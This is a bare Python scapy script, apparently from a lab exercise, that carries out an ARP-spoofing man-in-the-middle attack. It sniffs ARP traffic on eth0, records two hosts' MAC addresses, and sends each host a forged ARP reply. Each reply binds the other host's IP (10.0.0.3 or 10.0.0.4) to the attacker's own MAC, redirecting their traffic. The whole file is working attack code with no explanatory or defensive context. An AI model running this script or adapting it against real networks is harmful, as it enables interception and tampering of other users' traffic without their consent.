from scapy.all import *

a = sniff(iface="eth0",count=4,filter="arp")
four = a[1].src
three= a[3].src
print("Four = "+ four)
print("Three = " + three)

sendp(Ether(src=get_if_hwaddr("eth0"), dst=three,type=0x0806)/ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),psrc="10.0.0.4",pdst="10.0.0.3"),iface="eth0")
sendp(Ether(src=get_if_hwaddr("eth0"), dst=four,type=0x0806)/ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),psrc="10.0.0.3",pdst="10.0.0.4"),iface="eth0")


